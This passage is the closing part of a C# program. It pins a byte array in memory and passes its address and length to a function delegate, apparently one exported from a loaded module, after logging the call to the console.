                GCHandle userDataHandle = GCHandle.Alloc(argumentBytes, GCHandleType.Pinned);
                IntPtr userDataPointer = userDataHandle.AddrOfPinnedObject();

                Console.WriteLine("[+] Calling exported function");

                exportedFunction(userDataPointer, (uint)argumentBytes.Length);
            }
        }
    }
}
